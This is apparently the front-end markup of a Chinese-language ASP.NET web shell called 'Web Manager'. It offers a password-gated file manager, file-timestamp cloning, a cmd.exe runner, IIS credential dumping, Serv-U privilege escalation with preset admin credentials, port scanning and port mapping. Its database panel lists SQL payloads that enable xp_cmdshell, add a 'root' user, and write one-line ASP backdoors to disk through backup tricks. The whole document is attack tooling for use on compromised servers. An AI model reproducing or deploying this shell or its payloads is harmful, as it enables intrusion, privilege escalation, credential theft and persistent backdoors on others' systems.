function CheckAll(form){
for(var i=0;i<form.elements.length;i++){
var e=form.elements[i];
if(e.name!='chkall')
e.checked=form.chkall.checked;
}
}
</script>
</head>
<body style="margin:0;table-layout:fixed;">
<form id="WebManager" runat="server">
<div id="ljtzC" runat="server" style=" margin:15px" enableviewstate="false" visible="false" >
<span style="font:11px Verdana;">Password:</span>
<asp:TextBox ID="HRJ" runat="server" Columns="20" CssClass="Bin_Style_Login" ></asp:TextBox>
<asp:Button ID="ZSnXu" runat="server" Text="Login" CssClass="Bin_Style_Login" OnClick="xVm"/><p/>
</div>
<div id="ZVS" runat="server">
<div id="Zzj" runat="server">
<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tr class="head">
<td ><span style="float:right;">Web Manager</span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
</tr>
<tr class="alt1">
<td><span style="float:right;" id="Bin_Span_FrameVersion" runat="server"></span>
<asp:LinkButton ID="UtkN" runat="server" OnClick="YKpI" Text="退出登录" ></asp:LinkButton> | <asp:LinkButton ID="RsqhW" runat="server" Text="文件(夹)管理" OnClick="Ybg"></asp:LinkButton> | <asp:LinkButton ID="xxzE" runat="server" Text="Cmd命令" OnClick="VOxn"></asp:LinkButton> | <asp:LinkButton ID="nuc" runat="server" Text="IIS探测" OnClick="KjPi"></asp:LinkButton> | <asp:LinkButton ID="OREpx" runat="server" Text="系统进程" OnClick="Grxk"></asp:LinkButton> | <asp:LinkButton ID="jHN" runat="server" Text="系统服务" OnClick="ilC"></asp:LinkButton> | <asp:LinkButton ID="PHq" runat="server" Text="用户(组)信息" OnClick="Olm"></asp:LinkButton> | <asp:LinkButton ID="wmgnK" runat="server" Text="系统信息" OnClick="HtB"></asp:LinkButton> | <asp:LinkButton ID="FeV" runat="server" Text="文件搜索" OnClick="PPtK"></asp:LinkButton> | <asp:LinkButton ID="PVQ" runat="server" Text="Serv-U提权" OnClick="jXhS"></asp:LinkButton> | <asp:LinkButton ID="jNDb" runat="server" Text="注册表查询" OnClick="xSy"></asp:LinkButton> | <asp:LinkButton ID="HDQ" runat="server" Text="端口扫描" OnClick="cptS" ></asp:LinkButton> | <asp:LinkButton ID="AoI" runat="server" Text="数据库管理" OnClick="dMx"></asp:LinkButton> | <asp:LinkButton ID="KHbEd" runat="server" Text="端口映射" OnClick="fDO"></asp:LinkButton>
</td>
</tr>
</table>
</div>
<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
<div id="jDKt" style="background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;" runat="server" visible="false" enableviewstate="false"></div>
<h2 id="Bin_H2_Title" runat="server"></h2>
<%--FileList--%>
<div id="CzfO" runat="server">
<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
 <tr>
<td style=" white-space:nowrap">当前目录 : </td>
<td style=" width:100%"><input class="input" id="AXSbb" type="text" style="width:97%;margin:0 8px;" runat="server"/>
</td>
<td style="white-space:nowrap" ><asp:Button ID="xaGwl" runat="server" Text="Go" CssClass="bt" OnClick="EXV"/></td>
 </tr>
</table>
<table width="100%" border="0" cellpadding="4" cellspacing="0">
<tr class="alt1"><td colspan="7" style="padding:5px;">
<div style="float:right;"><input id="Fhq" class="input" runat="server" type="file" style=" height:22px"/>
<asp:Button ID="RvPp" CssClass="bt" runat="server" Text="上传" OnClick="lbjLD"/></div><asp:LinkButton ID="OLJFp" runat="server" Text="网站目录" OnClick="mcCY"></asp:LinkButton> | <a href="#" id="Bin_Button_CreateDir" runat="server">木马目录</a> | <a href="#" id="Bin_Button_CreateFile" runat="server">新建目录</a>
 | <span id="Bin_Span_Drv" runat="server"></span><a href="#" id="Bin_Button_KillMe" runat="server" style="color:Red">木马自杀</a>
</td></tr>
<asp:Table ID="UGzP" runat="server" Width="100%" CellSpacing="0" >
<asp:TableRow CssClass="head"><asp:TableCell>&nbsp;</asp:TableCell><asp:TableCell>文件(夹)名</asp:TableCell><asp:TableCell Width="25%">最后修改时间</asp:TableCell><asp:TableCell Width="15%">大小</asp:TableCell><asp:TableCell Width="25%">操作</asp:TableCell></asp:TableRow>
</asp:Table>
</table>
</div>
<%--FileEdit--%>
<div id="vrFA" runat="server">
<p>当前文件（创建新的文件名和新文件）<br/>
<input class="input" id="Sqon" type="text" size="100" runat="server"/> <asp:DropDownList ID="NdCX" runat="server" CssClass="list" AutoPostBack="true" OnSelectedIndexChanged="zOVO"><asp:ListItem>Default</asp:ListItem><asp:ListItem>UTF-8</asp:ListItem></asp:DropDownList>
</p>
<p>文件内容<br/>
<textarea id="Xgvv" runat="server" class="area" cols="100" rows="25" enableviewstate="true" ></textarea>
</p>
<p><asp:Button ID="JJjbW" runat="server" Text="提交" CssClass="bt" OnClick="DGCoW"/> <asp:Button ID="iCNu" runat="server" Text="返回" CssClass="bt" OnClick="IkkO"/></p>
</div>
<%--CloneTime--%>
<div id="zRyG" runat="server" enableviewstate="false" visible="false">
<p>修改文件<br/><input class="input" id="QiFB" type="text" size="120" runat="server"/></p>
<p>参考文件<br/><input class="input" id="lICp" type="text" size="120" runat="server"/></p>
<p><asp:Button ID="JEaxV" runat="server" Text="提交" CssClass="bt" OnClick="XXrLw"/></p>
<h2>设置最后修改时间 &raquo;</h2>
<p>当前文件<br/><input class="input" id="pWVL" type="text" size="120" runat="server"/></p>
<p>
<asp:CheckBox ID="ZhWSK" runat="server" Text="只读" EnableViewState="False"/>
&nbsp;
<asp:CheckBox ID="SsR" runat="server" Text="系统" EnableViewState="False"/>
&nbsp;
<asp:CheckBox ID="ccB" runat="server" Text="隐藏" EnableViewState="False"/>
&nbsp;
<asp:CheckBox ID="fbyZ" runat="server" Text="存档" EnableViewState="False"/>
</p>
<p>
创建时间 :
<input class="input" id="yUqx" type="text" runat="server"/>
最后修改时间 :
<input class="input" id="uYjw" type="text" runat="server"/>
最后访问时间 :
<input class="input" id="aLsn" type="text" runat="server"/>
</p>
<p>
<asp:Button ID="kOG" CssClass="bt" runat="server" Text="提交" OnClick="tIykC"/>
</p>
</div>
<%--IISSpy--%>
<div runat="server" id="VNR" visible="false" enableviewstate="false">
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
<asp:Table ID="GlI" runat="server" Width="100%" CellSpacing="0">
<asp:TableRow CssClass="head"><asp:TableCell>ID</asp:TableCell><asp:TableCell>IIS_USER</asp:TableCell><asp:TableCell>IIS_PASS</asp:TableCell><asp:TableCell>Domain</asp:TableCell><asp:TableCell>Path</asp:TableCell></asp:TableRow>
</asp:Table>
</table>
</div>
<%--Process--%>
<div runat="server" id="DCbS" visible="false" enableviewstate="false">
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
<asp:Table ID="IjsL" runat="server" Width="100%" CellSpacing="0" >
<asp:TableRow CssClass="head"><asp:TableCell></asp:TableCell><asp:TableCell>ID</asp:TableCell><asp:TableCell>Process</asp:TableCell><asp:TableCell>ThreadCount</asp:TableCell><asp:TableCell>Priority</asp:TableCell><asp:TableCell>Action</asp:TableCell></asp:TableRow>
</asp:Table>
</table>
</div>
<%--CmdShell--%>
<div runat="server" id="vIac">
 <p>Cmd路径:<br/>
 <input class="input" runat="server" id="kusi" type="text" size="100" value="c:\windows\system32\cmd.exe"/>
 </p>
 语句:<br/>
 <input class="input" runat="server" id="bkcm" value="/c Set" type="text" size="100"/> <asp:Button ID="YrqL" CssClass="bt" runat="server" Text="执行" OnClick="FbhN"/>
 <div id="tnQRF" runat="server" visible="false" enableviewstate="false">
 </div>
</div>
<%--Services--%>
<div runat="server" id="iQxm" visible ="false" enableviewstate="false">
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
<asp:Table ID="vHCs" runat="server" Width="100%" CellSpacing="0" >
<asp:TableRow CssClass="head"><asp:TableCell></asp:TableCell><asp:TableCell>ID</asp:TableCell><asp:TableCell>Name</asp:TableCell><asp:TableCell>Path</asp:TableCell><asp:TableCell>State</asp:TableCell><asp:TableCell>StartMode</asp:TableCell></asp:TableRow>
</asp:Table>
</table>
</div>
<%--Sysinfo--%>
<div runat="server" id="ghaB" visible="false" enableviewstate="false">
<hr style=" border: 1px solid #ddd;height:0px;"/>
<ul class="info" id="Bin_Ul_Sys" runat="server"></ul>
<h2 id="Bin_H2_Mac" runat="server"></h2>
<hr style=" border: 1px solid #ddd;height:0px;"/>
<ul class="info" id ="Bin_Ul_NetConfig" runat="server"></ul>
<h2 id="Bin_H2_Driver" runat="server"></h2>
<hr style=" border: 1px solid #ddd;height:0px;"/>
<ul class="info" id ="Bin_Ul_Driver" runat="server"></ul>
</div>
<%--UserInfo--%>
<div runat="server" id="xWVQ" visible="false" enableviewstate="false">
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
<asp:Table ID="VPa" runat="server" Width="100%" CellSpacing="0" >
</asp:Table>
</table>
</div>
<%--SuExp--%>
 <div runat="server" id="APl">
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
 <tr align="center">
 <td style="width:10%"></td>
 <td style="width:20%" align="left">用户名 : <input class="input" runat="server" id="dNohJ" type="text" size="20" value="localadministrator"/></td>
 <td style="width:20%" align="left">密码 : <input class="input" runat="server" id="NMd" type="text" size="20" value="#l@$ak#.lk;0@P"/></td>
 <td style="width:20%" align="left">端口 : <input class="input" runat="server" id="HlQl" type="text" size="20" value="43958"/></td>
 <td style="width:10%"></td>
 </tr>
 <tr >
 <td style="width:10%"></td>
 <td colspan="5">CmdShell&nbsp;&nbsp;:&nbsp;<input class="input" runat="server" id="mHbjB" type="text" size="100" value="cmd.exe /c net user"/> <asp:Button ID="SPhc" CssClass="bt" runat="server" Text="执行" OnClick="lRfRj"/></td>
 </tr>
</table>
<div id="UHlA" visible="false" enableviewstate="false" runat="server">
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
<tr align="center">
<td style="width:30%"></td>
<td align="left" style="width:40%"><pre id="Bin_Td_Res" runat="server"></pre></td>
<td style="width:30%"></td>
</tr>
</table>
</div>
</div>
<%--Reg--%>
<div id="kkHN" runat="server">
<p>注册表路径 : <asp:TextBox id="qPdI" style="width:85%;margin:0 8px;" CssClass="input" runat="server"/><asp:Button ID="MoNA" runat="server" Text="Go" CssClass="bt" onclick="RAFL"/></p>
<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
<asp:Table ID="pLWD" runat="server" Width="100%" CellSpacing="0" >
<asp:TableRow CssClass="alt1"><asp:TableCell ColumnSpan="2" id="vyX"></asp:TableCell></asp:TableRow>
<asp:TableRow CssClass="head"><asp:TableCell Width="40%">Key</asp:TableCell><asp:TableCell Width="60%">Value</asp:TableCell></asp:TableRow>
</asp:Table>
</table>
</div>
<%--PortScan--%>
<div id="YwLB" runat="server">
<p>
IP : <asp:TextBox id="MdR" style="width:10%;margin:0 8px;" CssClass="input" runat="server" Text="127.0.0.1"/> 端口 : <asp:TextBox id="lOmX" style="width:40%;margin:0 8px;" CssClass="input" runat="server" Text="21,25,80,110,1433,1723,3306,3389,4899,5631,43958,65500"/> <asp:Button ID="CmUCh" runat="server" Text="扫描" CssClass="bt" OnClick="ELkQ"/>
</p>
<div id="GBYT" runat="server" visible="false" enableviewstate="false"></div>
</div>
<%--DataBase--%>
<div id="iDgmL" runat="server">
<p>语句 : <asp:TextBox id="MasR" style="width:70%;margin:0 8px;" CssClass="input" runat="server"/><asp:DropDownList runat="server" CssClass="list" ID="WYmo" AutoPostBack="True" OnSelectedIndexChanged="zOVO" ><asp:ListItem></asp:ListItem><asp:ListItem Value="server=localhost;UID=sa;PWD=;database=master;Provider=SQLOLEDB">MSSQL</asp:ListItem><asp:ListItem Value="Provider=Microsoft.Jet.OLEDB.4.0;Data Source=E:\database.mdb">ACCESS</asp:ListItem></asp:DropDownList><asp:Button ID="QcZPA" runat="server" Text="Go" CssClass="bt" OnClick="BGY"/></p>
<div id="dQIIF" runat="server">
<div id="irTU" runat="server"></div>
<div id="uXevN" runat="server">
Please select a database : <asp:DropDownList runat="server" ID="Pvf" AutoPostBack="True" OnSelectedIndexChanged="zOVO" CssClass="list"></asp:DropDownList>
SQLExec : <asp:DropDownList runat="server" ID="FGEy" AutoPostBack="True" OnSelectedIndexChanged="zOVO" CssClass="list"><asp:ListItem Value="">-- SQL Server Exec --</asp:ListItem><asp:ListItem Value="Use master dbcc addextendedproc('xp_cmdshell','xplog70.dll')">Add xp_cmdshell</asp:ListItem><asp:ListItem Value="Use master dbcc addextendedproc('sp_OACreate','odsole70.dll')">Add sp_oacreate</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;">Add xp_cmdshell(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;">Add sp_oacreate(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Web Assistant Procedures',1;RECONFIGURE;">Add makewebtask(SQL2005)</asp:ListItem><asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;">Add openrowset/opendatasource(SQL2005)</asp:ListItem><asp:ListItem Value="Exec master.dbo.xp_cmdshell 'net user'">XP_cmdshell exec</asp:ListItem><asp:ListItem Value="EXEC MASTER..XP_dirtree 'c:\',1,1">XP_dirtree</asp:ListItem><asp:ListItem Value="Declare @s int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^>>c:\bin.asp';">SP_oamethod exec</asp:ListItem><asp:ListItem Value="sp_makewebtask @outputfile='c:\bin.asp',@charset=gb2312,@query='select ''&lt;%execute(request(chr(35)))%&gt;'''">SP_makewebtask make file</asp:ListItem><asp:ListItem Value="exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;select * from openrowset('microsoft.jet.oledb.4.0',';database=c:\windows\system32\ias\ias.mdb','select shell(&#34;cmd.exe /c net user root root/add &#34;)')">SandBox</asp:ListItem><asp:ListItem Value="create table [bin_cmd]([cmd] [image]);declare @a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E backup log @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='e:\1.asp' backup log @b to disk=@t with init,no_truncate;drop table [bin_cmd];">LogBackup</asp:ListItem><asp:ListItem Value="create table [bin_cmd]([cmd] [image]);declare @a sysname,@s nvarchar(4000)select @a=db_name(),@s=0x62696E backup database @a to disk=@s;insert into [bin_cmd](cmd)values('&lt;%execute(request(chr(35)))%&gt;');declare @b sysname,@t nvarchar(4000)select @b=db_name(),@t='c:\bin.asp' backup database @b to disk=@t WITH DIFFERENTIAL,FORMAT;drop table [bin_cmd];">DatabaseBackup</asp:ListItem></asp:DropDownList>
</div>
<table width="200" border="0" cellpadding="0" cellspacing="0"><tr><td> Run SQL </td></tr><tr><td><textarea id="jHIy" class="area" style="width:600px;height:60px;overflow:auto;" runat="server" rows="6" cols="1"></textarea></td></tr><tr><td>
<asp:Button runat="server" ID="WOhJ" CssClass="bt" Text="Query" onclick="ORUgV"/></td></tr></table>
<div style="overflow-x:auto;width:950px" >
<p>
<asp:DataGrid runat="server" ID="rom" HeaderStyle-CssClass="head" BorderWidth="0" GridLines="None" ></asp:DataGrid>
</p>
</div>
</div>
</div>
<%--PortMap--%>
<div id="hOWTm" runat="server">
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
<tr align="center">
<td style="width:5%"></td>
<td style="width:20%" align="left">本地Ip : <input class="input" runat="server" id="eEpm" type="text" size="20" value="127.0.0.1"/></td>
<td style="width:20%" align="left">本地端口 : <input class="input" runat="server" id="iXdh" type="text" size="20" value="3389"/></td>
<td style="width:20%" align="left">远程Ip : <input class="input" runat="server" id="llH" type="text" size="20" value="127.0.0.1"/></td>
<td style="width:20%" align="left">远端口程 : <input class="input" runat="server" id="ZHS" type="text" size="20" value="80"/></td></tr>
<tr align="center"><td colspan="5"><br/><asp:Button ID="FJE" CssClass="bt" runat="server" Text="映射端口" OnClick="wDZ"/> <asp:Button ID="giX" CssClass="bt" runat="server" Text="清除所有" OnClick="vJNsE"/> <asp:Button ID="GFsm" CssClass="bt" runat="server" Text="刷新" OnClick="tYoZ"/></td></tr></table></div>
<%--Search--%>
<div id="yhv" runat="server">
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
<tr align="center">
<td style="width:20%" align="left">关键词</td>
<td style="width:60%" align="left"><textarea id="iaMKl" runat="server" class="area" style="width:100%" rows="4"></textarea></td>
<td style="width:20%" align="left"><input type="checkbox" runat="server" id="rAQ" value="1"/> 使用正则表达式</td>
</tr>
<tr align="center">
<td style="width:20%" align="left">替换</td>
<td style="width:60%" align="left"><textarea id="qPe" runat="server" class="area" style="width:100%" rows="4"></textarea></td>
<td style="width:20%" align="left"><input type="checkbox" runat="server" id="YZw"/> 替换</td>
</tr>
<tr align="center">
<td style="width:20%" align="left">搜索文件类型</td>
<td style="width:60%" align="left"><input type="text" runat="server" class="input" id="UDLvA" style="width:100%" value="asp|asa|cer|cdx|aspx|asax|ascx|cs|jsp|php|txt|inc|ini|js|htm|html|xml|config"/></td>
<td style="width:20%" align="left"><asp:DropDownList runat="server" ID="Ven" AutoPostBack="False" CssClass="list"><asp:ListItem Value="name">文件名称</asp:ListItem><asp:ListItem Value="content" Selected="True">文件内容</asp:ListItem></asp:DropDownList></td>
</tr>
<tr align="center">
<td style="width:20%" align="left">路径</td>
<td style="width:60%" align="left"><input type="text" class="input" id="NaLJ" runat="server" style="width:100%" /></td>
<td style="width:20%" align="left"><asp:Button CssClass="bt" id="axy" runat="server" onclick="NBy" Text="开始" /></td>
</tr>
</table>
<br/>
<br/>
<asp:Table ID="oJiym" runat="server" Width="100%" CellSpacing="0" >
<asp:TableRow CssClass="head"><asp:TableCell Width="60%">File Path</asp:TableCell><asp:TableCell Width="20%">Last modified</asp:TableCell><asp:TableCell Width="20%">Size</asp:TableCell></asp:TableRow>
</asp:Table>
</div>
</td></tr></table>
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#e6f0ff;">Web ManAger</div></div>
</form>
</body>
</html>
